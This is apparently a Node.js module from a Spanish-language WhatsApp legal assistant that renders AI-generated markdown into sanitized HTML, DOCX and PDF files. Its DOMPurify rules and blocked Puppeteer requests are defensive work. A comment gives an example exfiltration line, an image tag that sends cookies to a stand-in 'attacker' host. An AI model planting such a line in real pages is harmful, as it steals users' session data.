const fs = require('fs');
const path = require('path');
const { marked } = require('marked');
const htmlToDocx = require('html-to-docx');
const DOMPurify = require('isomorphic-dompurify');
const config = require('./config');

const ROOT = path.join(__dirname, '..', 'data', 'creado-por-whatsapp');
fs.mkdirSync(ROOT, { recursive: true });

// C5: configuración DOMPurify restrictiva. Permite formato de documento
// legal (h1-h6, p, listas, tablas, blockquote, strong, em) pero PROHÍBE:
//   - <script>, <iframe>, <object>, <embed>
//   - atributos on* (onerror, onload, etc.)
//   - href con javascript:, data:text/html
//   - <style> y atributos style con expression()
// El contenido_markdown llega de Claude pero Claude propaga texto del
// cliente → un cliente con un PDF malicioso podría inyectar JS que se
// ejecutaría en Puppeteer al renderizar el PDF, con acceso a localhost.
const SANITIZE_CONFIG = {
  ALLOWED_TAGS: [
    'h1','h2','h3','h4','h5','h6',
    'p','br','hr','div','span',
    'strong','em','u','b','i','s','del','ins','small','sub','sup','mark',
    'ul','ol','li',
    'blockquote','pre','code',
    'table','thead','tbody','tfoot','tr','th','td',
    'a',
  ],
  ALLOWED_ATTR: ['href','class','colspan','rowspan'],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel):/i, // ni javascript: ni data:
  FORBID_TAGS: ['script','iframe','object','embed','link','style','form','input','button'],
  FORBID_ATTR: ['style','onerror','onload','onclick','onmouseover','onfocus','onblur','formaction','srcdoc','xlink:href'],
  KEEP_CONTENT: true,
};

function sanitizarHtml(html) {
  return DOMPurify.sanitize(html, SANITIZE_CONFIG);
}

let browserPromise = null;

function cargarPuppeteer() {
  try { return require('puppeteer'); } catch (_) {}
  try { return require('whatsapp-web.js/node_modules/puppeteer'); } catch (_) {}
  throw new Error('puppeteer no disponible. Asegúrate de que whatsapp-web.js está instalado.');
}

function descubrirChromeEjecutable() {
  if (config.puppeteerExecutablePath && fs.existsSync(config.puppeteerExecutablePath)) {
    return config.puppeteerExecutablePath;
  }

  // Rutas habituales en Windows / Linux / macOS
  const candidatos = [
    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
    process.env.LOCALAPPDATA && path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'Application', 'chrome.exe'),
    'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
    'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
    '/usr/bin/chromium',
    '/usr/bin/chromium-browser',
    '/usr/bin/google-chrome',
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
  ].filter(Boolean);

  for (const c of candidatos) {
    try { if (fs.existsSync(c)) return c; } catch (_) {}
  }

  // Fallback al Chromium que descarga puppeteer (si está bien instalado).
  try {
    const puppeteer = cargarPuppeteer();
    if (typeof puppeteer.executablePath === 'function') {
      const p = puppeteer.executablePath();
      if (p && fs.existsSync(p)) return p;
    }
  } catch (_) {}

  return null;
}

async function getBrowser() {
  if (browserPromise) return browserPromise;
  const puppeteer = cargarPuppeteer();
  const exe = descubrirChromeEjecutable();
  if (!exe) {
    throw new Error(
      'No he encontrado Chrome/Chromium en el sistema. Instala Google Chrome o ejecuta "npx puppeteer browsers install chrome".'
    );
  }
  console.log(`[documentos] Usando navegador para PDFs: ${exe}`);
  browserPromise = puppeteer.launch({
    headless: true,
    executablePath: exe,
    args: ['--no-sandbox', '--disable-setuid-sandbox'],
  });
  const browser = await browserPromise;
  // I7: si Chrome muere (crash, OOM), limpiamos para que el siguiente
  // exportarPdf lance un browser nuevo en vez de quedarse pegado.
  browser.on('disconnected', () => {
    console.warn('[documentos] Puppeteer se desconectó. Próxima petición lanzará nuevo browser.');
    browserPromise = null;
  });
  return browser;
}

async function cerrarBrowser() {
  if (!browserPromise) return;
  try {
    const b = await browserPromise;
    await b.close();
  } catch (_) {}
  browserPromise = null;
}

function sanitizar(s, max = 60) {
  if (!s) return 'sin_nombre';
  const limpio = String(s)
    .normalize('NFD')
    .replace(/[̀-ͯ]/g, '')
    .replace(/[^a-zA-Z0-9_-]+/g, '_')
    .replace(/^_+|_+$/g, '')
    .slice(0, max);
  return limpio || 'sin_nombre';
}

function escapeHtml(s) {
  return String(s || '').replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

function carpetaCliente({ telefono, nombre }) {
  const tag = sanitizar([telefono, nombre].filter(Boolean).join('_')) || 'sin_identificar';
  return path.join(ROOT, tag);
}

function safeJoin(base, ...partes) {
  const candidato = path.resolve(base, ...partes);
  const baseResuelta = path.resolve(base);
  if (!candidato.startsWith(baseResuelta + path.sep) && candidato !== baseResuelta) {
    throw new Error('Ruta inválida (intento de path traversal).');
  }
  return candidato;
}

const ESTILOS_CSS = `
body { font-family: 'Times New Roman', Georgia, serif; font-size: 12pt; line-height: 1.55; color: #000; margin: 0; }
.wrap { max-width: 17.5cm; margin: 0 auto; }
h1 { font-size: 16pt; text-align: center; text-transform: uppercase; letter-spacing: 0.5px; margin: 0.5em 0 1em; }
h2 { font-size: 13pt; margin-top: 1.6em; }
h3 { font-size: 12pt; font-weight: bold; margin-top: 1.2em; }
p { text-align: justify; margin: 0.6em 0; }
ul, ol { margin: 0.6em 0; padding-left: 2em; }
li { margin: 0.3em 0; }
table { border-collapse: collapse; width: 100%; margin: 0.8em 0; }
th, td { border: 1px solid #999; padding: 6px 8px; vertical-align: top; }
blockquote { border-left: 3px solid #bbb; margin: 0.8em 0; padding: 0.2em 0.8em; color: #444; font-style: italic; }
hr { border: none; border-top: 1px solid #999; margin: 1.5em 0; }
.firma { margin-top: 3em; }
.firma .linea { border-top: 1px solid #000; width: 60%; margin-top: 3em; padding-top: 0.3em; }
.pie { text-align: center; font-size: 10pt; color: #555; margin-top: 2em; }
`;

function paginaHtml({ titulo, contenidoHtml, despacho, pie }) {
  return `<!doctype html>
<html lang="es"><head><meta charset="utf-8">
<title>${escapeHtml(titulo)}</title>
<style>${ESTILOS_CSS}</style>
</head><body><div class="wrap">
${contenidoHtml}
${pie ? `<div class="pie">${escapeHtml(pie)}${despacho ? ' · ' + escapeHtml(despacho) : ''}</div>` : ''}
</div></body></html>`;
}

async function crearDocumento({
  titulo,
  tipo,
  contenido_markdown,
  cliente_nombre,
  cliente_telefono,
  origen, // 'texto' | 'voz' | 'imagen' | 'pdf' (de qué tipo de mensaje vino)
}) {
  if (!titulo || !contenido_markdown) {
    return { ok: false, error: 'Faltan título o contenido_markdown.' };
  }

  const carpetaC = carpetaCliente({ telefono: cliente_telefono, nombre: cliente_nombre });
  fs.mkdirSync(carpetaC, { recursive: true });

  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const slug = sanitizar(titulo);
  const docDir = path.join(carpetaC, `${ts}__${slug}`);
  fs.mkdirSync(docDir, { recursive: true });

  fs.writeFileSync(path.join(docDir, 'documento.md'), contenido_markdown, 'utf8');

  // C5: marked → HTML potencialmente con tags peligrosos → DOMPurify lo limpia
  // antes de meterlo en cualquier renderer (Puppeteer, html-to-docx).
  const innerHtmlRaw = marked.parse(contenido_markdown, { async: false });
  const innerHtml = sanitizarHtml(innerHtmlRaw);
  const html = paginaHtml({
    titulo,
    contenidoHtml: innerHtml,
    despacho: config.despachoNombre,
    pie: `Generado por el asistente IA — ${new Date().toLocaleString('es-ES', { timeZone: config.timezone })}`,
  });
  fs.writeFileSync(path.join(docDir, 'documento.html'), html, 'utf8');

  let docxOk = false;
  try {
    const buffer = await htmlToDocx(html, null, {
      orientation: 'portrait',
      pageSize: { width: 11906, height: 16838 }, // A4 en twips
      margins: { top: 1440, bottom: 1440, left: 1440, right: 1440 },
      font: 'Times New Roman',
      fontSize: 24, // 12pt en half-points
      table: { row: { cantSplit: true } },
    });
    fs.writeFileSync(path.join(docDir, 'documento.docx'), buffer);
    docxOk = true;
  } catch (err) {
    console.error('[documentos] Error generando .docx:', err.message);
  }

  const meta = {
    documento_id: '',
    titulo,
    tipo: tipo || 'documento',
    cliente_nombre: cliente_nombre || null,
    cliente_telefono: cliente_telefono || null,
    origen: origen || null,
    creado: new Date().toISOString(),
    archivos: ['documento.md', 'documento.html'],
    pdf_exportado: null,
  };
  if (docxOk) meta.archivos.push('documento.docx');

  const documento_id = path.relative(ROOT, docDir).replace(/\\/g, '/');
  meta.documento_id = documento_id;
  fs.writeFileSync(path.join(docDir, 'meta.json'), JSON.stringify(meta, null, 2), 'utf8');

  console.log(`[documentos] Creado: ${documento_id}`);

  return {
    ok: true,
    documento_id,
    titulo,
    archivos: meta.archivos,
    carpeta: docDir,
  };
}

async function exportarPdf({ documento_id }) {
  if (!documento_id) return { ok: false, error: 'Falta documento_id.' };

  let docDir;
  try { docDir = safeJoin(ROOT, documento_id); } catch (e) { return { ok: false, error: e.message }; }

  const htmlPath = path.join(docDir, 'documento.html');
  if (!fs.existsSync(htmlPath)) return { ok: false, error: 'Documento no encontrado.' };

  const html = fs.readFileSync(htmlPath, 'utf8');
  const pdfPath = path.join(docDir, 'documento.pdf');

  try {
    const browser = await getBrowser();
    const page = await browser.newPage();
    try {
      // C5: bloquear cualquier petición saliente del HTML renderizado.
      // Si por algún despiste se cuela una <img src="http://attacker/?cookie">
      // o un fetch() inyectado, no podrá filtrar nada.
      await page.setRequestInterception(true);
      page.on('request', (req) => {
        const url = req.url();
        if (url.startsWith('data:') || url.startsWith('about:')) return req.continue();
        return req.abort('blockedbyclient');
      });
      // Sin JS: el HTML del documento es estático, no necesita ejecutarlo.
      await page.setJavaScriptEnabled(false);
      await page.setContent(html, { waitUntil: 'load', timeout: 30000 });
      await page.pdf({
        path: pdfPath,
        format: 'A4',
        margin: { top: '2.5cm', bottom: '2.5cm', left: '2.5cm', right: '2.5cm' },
        printBackground: true,
      });
    } finally {
      await page.close();
    }
  } catch (err) {
    return { ok: false, error: `Error generando PDF: ${err.message}` };
  }

  const metaPath = path.join(docDir, 'meta.json');
  const meta = JSON.parse(fs.readFileSync(metaPath, 'utf8'));
  meta.pdf_exportado = new Date().toISOString();
  if (!meta.archivos.includes('documento.pdf')) meta.archivos.push('documento.pdf');
  fs.writeFileSync(metaPath, JSON.stringify(meta, null, 2), 'utf8');

  console.log(`[documentos] PDF exportado: ${documento_id}`);
  return { ok: true, documento_id, pdf_path: pdfPath, archivos: meta.archivos };
}

function listarDocumentos({ cliente_telefono, cliente_nombre, max = 20 } = {}) {
  if (!fs.existsSync(ROOT)) return { ok: true, total: 0, documentos: [] };

  const docs = [];
  const filtroTel = cliente_telefono ? sanitizar(cliente_telefono) : null;
  const filtroNom = cliente_nombre ? sanitizar(cliente_nombre).toLowerCase() : null;

  for (const sub of fs.readdirSync(ROOT)) {
    const ruta = path.join(ROOT, sub);
    if (!fs.statSync(ruta).isDirectory()) continue;
    if (filtroTel && !sub.includes(filtroTel)) continue;
    if (filtroNom && !sub.toLowerCase().includes(filtroNom)) continue;

    for (const subDoc of fs.readdirSync(ruta)) {
      const docDir = path.join(ruta, subDoc);
      const metaPath = path.join(docDir, 'meta.json');
      if (!fs.existsSync(metaPath)) continue;
      try {
        const meta = JSON.parse(fs.readFileSync(metaPath, 'utf8'));
        docs.push(meta);
      } catch (_) {}
    }
  }

  docs.sort((a, b) => (b.creado || '').localeCompare(a.creado || ''));
  return { ok: true, total: docs.length, documentos: docs.slice(0, max) };
}

function getDocumentoMeta(documento_id) {
  let docDir;
  try { docDir = safeJoin(ROOT, documento_id); } catch (_) { return null; }
  const metaPath = path.join(docDir, 'meta.json');
  if (!fs.existsSync(metaPath)) return null;
  try {
    return { meta: JSON.parse(fs.readFileSync(metaPath, 'utf8')), docDir };
  } catch (_) {
    return null;
  }
}

function getDocumentoArchivo(documento_id, nombreArchivo) {
  const info = getDocumentoMeta(documento_id);
  if (!info) return null;
  if (!info.meta.archivos.includes(nombreArchivo)) return null;
  return safeJoin(info.docDir, nombreArchivo);
}

module.exports = {
  crearDocumento,
  exportarPdf,
  listarDocumentos,
  getDocumentoMeta,
  getDocumentoArchivo,
  cerrarBrowser,
  ROOT,
};
